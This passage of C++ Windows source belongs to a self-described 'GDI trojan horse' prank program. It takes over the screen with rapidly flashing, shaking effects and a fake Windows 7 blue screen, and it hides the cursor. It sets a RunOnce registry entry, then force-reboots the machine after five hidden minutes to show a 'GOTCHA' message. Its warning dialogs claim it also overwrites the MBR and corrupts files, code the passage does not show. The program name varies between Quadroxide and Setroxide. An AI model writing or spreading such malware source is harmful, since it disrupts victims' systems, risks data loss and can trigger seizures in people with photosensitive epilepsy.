        DeleteDC(bsodDc);
        SelectObject(frameDc, oldFrameBmp);
        DeleteDC(frameDc);
        return;
    }

    if (t < 480000.0) {
        HDC bsodDc = CreateCompatibleDC(refDc);
        HGDIOBJ oldBsodBmp = SelectObject(bsodDc, g_hBsodBmp);
        BitBlt(frameDc, 0, 0, kBufW, kBufH, bsodDc, 0, 0, SRCCOPY);
        SelectObject(bsodDc, oldBsodBmp);
        DeleteDC(bsodDc);
    } else if (t < 840000.0) {
        int shakeX = (std::rand() % 19) - 9;
        int shakeY = (std::rand() % 15) - 7;

        HBRUSH bgBrush = CreateSolidBrush(RGB(14, 46, 128));
        RECT fullRect = { 0, 0, kBufW, kBufH };
        FillRect(frameDc, &fullRect, bgBrush);
        DeleteObject(bgBrush);

        HDC bsodDc = CreateCompatibleDC(refDc);
        HGDIOBJ oldBsodBmp = SelectObject(bsodDc, g_hBsodBmp);
        BitBlt(frameDc, shakeX, shakeY, kBufW, kBufH, bsodDc, 0, 0, SRCCOPY);
        SelectObject(bsodDc, oldBsodBmp);
        DeleteDC(bsodDc);

        GdiFlush();

        int xorOx = std::rand() % 256;
        int xorOy = std::rand() % 256;
        int colW = 14 + (std::rand() % 66);
        int xorShift = 1 + (std::rand() % 4);
        const int alpha = 155;

        for (int y = 0; y < kBufH; ++y) {
            int rowIdx = y * kBufW;
            int yy = ((y + xorOy) >> xorShift) & 255;
            for (int x = 0; x < kBufW; ++x) {
                int xx = ((x + xorOx) >> xorShift) & 255;
                int xorVal = (xx ^ yy) & 63;

                bool whiteCell = (((x + xorOx) / colW) % 2) == 0;
                int shade = 150 + ((xorVal * 105) >> 6);
                if (shade > 255) shade = 255;

                unsigned char overR, overG, overB;
                if (whiteCell) {
                    overR = 255;
                    overG = (unsigned char)shade;
                    overB = (unsigned char)shade;
                } else {
                    overR = (unsigned char)shade;
                    overG = (unsigned char)((xorVal * 35) >> 6);
                    overB = (unsigned char)((xorVal * 35) >> 6);
                }

                std::uint32_t px = g_pFramePixels[rowIdx + x];
                unsigned char baseR = (unsigned char)((px >> 16) & 0xFF);
                unsigned char baseG = (unsigned char)((px >> 8) & 0xFF);
                unsigned char baseB = (unsigned char)(px & 0xFF);

                unsigned char outR = BlendChannel(baseR, overR, alpha);
                unsigned char outG = BlendChannel(baseG, overG, alpha);
                unsigned char outB = BlendChannel(baseB, overB, alpha);

                g_pFramePixels[rowIdx + x] = MakeRgb(outR, outG, outB);
            }
        }
    } else {
        int bandShiftY = std::rand() % kBufH;
        int bandH = 12 + (std::rand() % 110);
        int staticScaleY = 1 + (std::rand() % 6);

        for (int y = 0; y < kBufH; ++y) {
            int rowIdx = y * kBufW;
            int band = ((y + bandShiftY) / bandH) % 2;
            int rowJitter = (std::rand() % 9) - 4;
            int sy = (y / staticScaleY) * staticScaleY;
            int rowNoise = std::rand() & 255;

            for (int x = 0; x < kBufW; ++x) {
                int sx = (x + rowJitter + kBufW) % kBufW;
                int n = (std::rand() & 127) + (rowNoise >> 1);
                int fineLine = ((sy + sx) & 1) ? 18 : -12;

                unsigned char r, g, b;
                if (band == 0) {
                    r = ClampByte(55 + (n >> 1) + fineLine);
                    g = ClampByte(110 + (n >> 1) + fineLine);
                    b = ClampByte(105 + (n >> 1) + fineLine);
                } else {
                    r = ClampByte(145 + (n >> 1) + fineLine);
                    g = ClampByte(85 + (n >> 2) + fineLine);
                    b = ClampByte(90 + (n >> 2) + fineLine);
                }

                g_pFramePixels[rowIdx + x] = MakeRgb(r, g, b);
            }
        }

        GdiFlush();

        SetBkMode(frameDc, TRANSPARENT);
        HFONT hRepeatFont = CreateFontA(
            20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            OEM_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, FIXED_PITCH | FF_MODERN, "Fixedsys"
        );
        HGDIOBJ oldFont = SelectObject(frameDc, hRepeatFont);

        std::string tiledText;
        tiledText.reserve(4500);
        for (int i = 0; i < 450; ++i) {
            tiledText += "Setroxide";
        }

        int jx = (std::rand() % 7) - 3;
        int jy = (std::rand() % 5) - 2;

        RECT shadowRect = { jx + 2, jy + 2, kBufW + jx + 2, kBufH + jy + 2 };
        RECT textRect = { jx, jy, kBufW + jx, kBufH + jy };

        SetTextColor(frameDc, RGB(25, 25, 35));
        DrawTextA(frameDc, tiledText.c_str(), -1, &shadowRect, DT_LEFT | DT_TOP | DT_WORDBREAK | DT_NOPREFIX);

        SetTextColor(frameDc, RGB(255, 255, 255));
        DrawTextA(frameDc, tiledText.c_str(), -1, &textRect, DT_LEFT | DT_TOP | DT_WORDBREAK | DT_NOPREFIX);

        SelectObject(frameDc, oldFont);
        DeleteObject(hRepeatFont);
    }

    SelectObject(frameDc, oldFrameBmp);
    DeleteDC(frameDc);
}

static void DrawBlackFlashAndStretchedWin7Bsod() {
    HDC scr = GetDC(nullptr);
    if (!scr) return;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    // 1. Flash black
    HBRUSH blackBr = CreateSolidBrush(RGB(0, 0, 0));
    RECT full = { 0, 0, sw, sh };
    FillRect(scr, &full, blackBr);
    DeleteObject(blackBr);
    GdiFlush();
    Sleep(220);

    // 2. Stretched fake Windows 7 BSOD across entire screen
    if (g_hBsodBmp) {
        HDC memDc = CreateCompatibleDC(scr);
        HGDIOBJ oldBmp = SelectObject(memDc, g_hBsodBmp);
        SetStretchBltMode(scr, COLORONCOLOR);
        StretchBlt(scr, 0, 0, sw, sh, memDc, 0, 0, kBufW, kBufH, SRCCOPY);
        SelectObject(memDc, oldBmp);
        DeleteDC(memDc);
        GdiFlush();
    }

    ReleaseDC(nullptr, scr);
}

static DWORD WINAPI FiveMinTimerWatcherThread(LPVOID lpParam) {
    (void)lpParam;
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

    while (g_audioRunning) {
        DWORD now = GetTickCount();
        if ((now - g_sessionStartTick) >= kHiddenFiveMinMs) {
            // Stop all effects and audio immediately
            g_finalSequenceStarted = true;
            g_audioRunning = false;

            // Register post-reboot message before rebooting
            RegisterPostRebootGotchaRunOnce();

            // Wait briefly for worker threads to stop touching screen
            HANDLE waits[3];
            int nWait = 0;
            if (g_hExplorerFakeScanThread) waits[nWait++] = g_hExplorerFakeScanThread;
            if (g_hRecycleWatcherThread) waits[nWait++] = g_hRecycleWatcherThread;
            if (g_hGdiEffectsThread) waits[nWait++] = g_hGdiEffectsThread;
            if (nWait > 0) {
                WaitForMultipleObjects((DWORD)nWait, waits, TRUE, 1500);
            }

            // Flash black, show stretched Windows 7 BSOD, and reboot
            g_finalBlackFlash = true;
            g_finalWin7BsodActive = true;
            DrawBlackFlashAndStretchedWin7Bsod();
            Sleep(3200);
            TriggerSystemRebootNow();
            return 0;
        }
        Sleep(100);
    }

    return 0;
}

static void StartBytebeatAudio() {
    if (g_audioRunning) return;
    g_bsodEnded = false;
    g_finalSequenceStarted = false;
    g_finalBlackFlash = false;
    g_finalWin7BsodActive = false;
    g_currentT = 0.0;
    g_activeTrackIdx = -1;
    g_trackEpoch = 0;
    g_recycleMsgActive = 0;
    g_explorerHideStep = 0;
    g_sessionStartTick = GetTickCount();
    g_audioRunning = true;
    g_hAudioThread = CreateThread(nullptr, 0, BytebeatThreadProc, nullptr, 0, nullptr);
    g_hRecycleWatcherThread = CreateThread(nullptr, 0, RecycleBinWatcherThread, nullptr, 0, nullptr);
    g_hExplorerFakeScanThread = CreateThread(nullptr, 0, ExplorerFakeScanHideThread, nullptr, 0, nullptr);
    g_hFiveMinWatcherThread = CreateThread(nullptr, 0, FiveMinTimerWatcherThread, nullptr, 0, nullptr);
}

static void StopBytebeatAudio() {
    g_audioRunning = false;
    HANDLE waits[4];
    int nWait = 0;
    if (g_hExplorerFakeScanThread) waits[nWait++] = g_hExplorerFakeScanThread;
    if (g_hRecycleWatcherThread) waits[nWait++] = g_hRecycleWatcherThread;
    if (g_hAudioThread) waits[nWait++] = g_hAudioThread;
    if (g_hGdiEffectsThread) waits[nWait++] = g_hGdiEffectsThread;
    if (nWait > 0) {
        WaitForMultipleObjects((DWORD)nWait, waits, TRUE, 2500);
    }
    if (g_hExplorerFakeScanThread) {
        CloseHandle(g_hExplorerFakeScanThread);
        g_hExplorerFakeScanThread = nullptr;
    }
    if (g_hRecycleWatcherThread) {
        CloseHandle(g_hRecycleWatcherThread);
        g_hRecycleWatcherThread = nullptr;
    }
    if (g_hAudioThread) {
        CloseHandle(g_hAudioThread);
        g_hAudioThread = nullptr;
    }
    if (g_hGdiEffectsThread) {
        CloseHandle(g_hGdiEffectsThread);
        g_hGdiEffectsThread = nullptr;
    }
    if (g_hFiveMinWatcherThread) {
        if (WaitForSingleObject(g_hFiveMinWatcherThread, 500) == WAIT_OBJECT_0) {
            CloseHandle(g_hFiveMinWatcherThread);
            g_hFiveMinWatcherThread = nullptr;
        }
    }
}

static LRESULT CALLBACK BsodWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            g_hBsodWnd = hwnd;
            g_screenW = GetSystemMetrics(SM_CXSCREEN);
            g_screenH = GetSystemMetrics(SM_CYSCREEN);
            HDC hdc = GetDC(hwnd);
            CreateWin7BsodBitmap800x600(hdc);
            CreateFrameDib800x600(hdc);
            RenderCurrentStage800x600(hdc, 0.0);
            ReleaseDC(hwnd, hdc);
            ShowCursor(FALSE);
            SetTimer(hwnd, kRenderTimerId, 33, nullptr);
            return 0;
        }
        case WM_TIMER: {
            if (wParam == kRenderTimerId) {
                if (g_finalSequenceStarted) {
                    DrawBlackFlashAndStretchedWin7Bsod();
                    return 0;
                }
                if (g_currentT >= 923140.0 || g_bsodEnded) {
                    DestroyWindow(hwnd);
                    return 0;
                }
                HDC hdc = GetDC(hwnd);
                RenderCurrentStage800x600(hdc, g_currentT);
                ReleaseDC(hwnd, hdc);
                InvalidateRect(hwnd, nullptr, FALSE);
            }
            return 0;
        }
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            if (g_finalSequenceStarted) {
                DrawBlackFlashAndStretchedWin7Bsod();
            } else if (g_hFrameBmp) {
                HDC memDc = CreateCompatibleDC(hdc);
                HGDIOBJ oldBmp = SelectObject(memDc, g_hFrameBmp);
                SetStretchBltMode(hdc, COLORONCOLOR);
                StretchBlt(hdc, 0, 0, g_screenW, g_screenH, memDc, 0, 0, kBufW, kBufH, SRCCOPY);
                SelectObject(memDc, oldBmp);
                DeleteDC(memDc);
            }
            EndPaint(hwnd, &ps);
            return 0;
        }
        case kCloseBsodMsgId:
            if (!g_finalSequenceStarted) {
                DestroyWindow(hwnd);
            }
            return 0;
        case WM_KEYDOWN:
            if (!g_finalSequenceStarted) {
                g_audioRunning = false;
                DestroyWindow(hwnd);
            }
            return 0;
        case WM_DESTROY:
            KillTimer(hwnd, kRenderTimerId);
            ShowCursor(TRUE);
            if (g_hFrameBmp) {
                DeleteObject(g_hFrameBmp);
                g_hFrameBmp = nullptr;
                g_pFramePixels = nullptr;
            }
            if (!g_finalSequenceStarted && g_hBsodBmp) {
                DeleteObject(g_hBsodBmp);
                g_hBsodBmp = nullptr;
            }
            if (g_hBsodWnd == hwnd) {
                g_hBsodWnd = nullptr;
            }
            if (!g_audioRunning && !g_finalSequenceStarted) {
                PostQuitMessage(0);
            }
            return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hPrevInstance;
    (void)nCmdShow;

    if (HasGotchaLaunchArg(lpCmdLine)) {
        ClearPostRebootGotchaRunOnce();
        MessageBoxA(
            nullptr,
            "GOTCHA! YOU WERE PRANKED! XDDD",
            "Setroxide",
            MB_ICONINFORMATION | MB_OK
        );
        return 0;
    }

    InitializeCriticalSection(&g_stateCs);
    InitDynamicCompatApis();
    g_osInfo = DetectWindows95To11();
    g_tlsStepSlot = TlsAlloc();
    std::srand(MixEntropySeed(0x1337u));

    int choice = MessageBoxA(
        nullptr,
        "WARNING!\n"
        "The software you just executed is Quadroxide.\n"
        "This program is an GDI trojan horse that overwrites the MBR, has epilepsy visuals, has loud sounds and corrupts all of your files.\n\n"
        "Do not run this on your main pc, as it can cause data loss!\n\n"
		"Do you want to run this GDI trojan horse?",
        "Quadroxide.exe by KernelXD",
        MB_ICONWARNING | MB_YESNO
    );

    if (choice != IDYES) {
        if (g_tlsStepSlot != TLS_OUT_OF_INDEXES) TlsFree(g_tlsStepSlot);
        DeleteCriticalSection(&g_stateCs);
        return 0;
    }

    int confirm = MessageBoxA(
        nullptr,
        "FINAL WARNING!\n"
        "The software you just executed is Quadroxide.\n"
        "This program is an GDI trojan horse that overwrites the MBR, has epilepsy visuals, has loud sounds and corrupts all of your files.\n\n"
        "Do not run this on your main pc, as it can cause data loss!\n\n"
		"Do you want to run this GDI trojan horse?\n\n"
		"Do you want to run this GDI trojan horse, as you have read the warnings above?",
        "Quadroxide.exe by KernelXD",
        MB_ICONWARNING | MB_YESNO
    );

    if (confirm != IDYES) {
        if (g_tlsStepSlot != TLS_OUT_OF_INDEXES) TlsFree(g_tlsStepSlot);
        DeleteCriticalSection(&g_stateCs);
        return 0;
    }

    TouchSafeRuntimeApis();

    WNDCLASSEXA wc = { 0 };
    wc.cbSize = sizeof(WNDCLASSEXA);
    wc.lpfnWndProc = BsodWndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = kBsodClass;
    wc.hCursor = LoadCursorA(nullptr, MAKEINTRESOURCEA(32512));

    if (!RegisterClassExA(&wc)) {
        if (g_tlsStepSlot != TLS_OUT_OF_INDEXES) TlsFree(g_tlsStepSlot);
        DeleteCriticalSection(&g_stateCs);
        return 1;
    }

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExA(
        WS_EX_TOPMOST,
        kBsodClass,
        "Windows",
        WS_POPUP | WS_VISIBLE,
        0, 0, w, h,
        nullptr, nullptr, hInstance, nullptr
    );

    if (!hwnd) {
        if (g_tlsStepSlot != TLS_OUT_OF_INDEXES) TlsFree(g_tlsStepSlot);
        DeleteCriticalSection(&g_stateCs);
        return 1;
    }

    StartBytebeatAudio();

    MSG msg;
    while (GetMessageA(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    StopBytebeatAudio();

    if (g_hBsodBmp) {
        DeleteObject(g_hBsodBmp);
        g_hBsodBmp = nullptr;
    }
    if (g_hScratchHeap) {
        HeapDestroy(g_hScratchHeap);
        g_hScratchHeap = nullptr;
    }
    if (g_tlsStepSlot != TLS_OUT_OF_INDEXES) {
        TlsFree(g_tlsStepSlot);
        g_tlsStepSlot = TLS_OUT_OF_INDEXES;
    }
    DeleteCriticalSection(&g_stateCs);
    return 0;
}
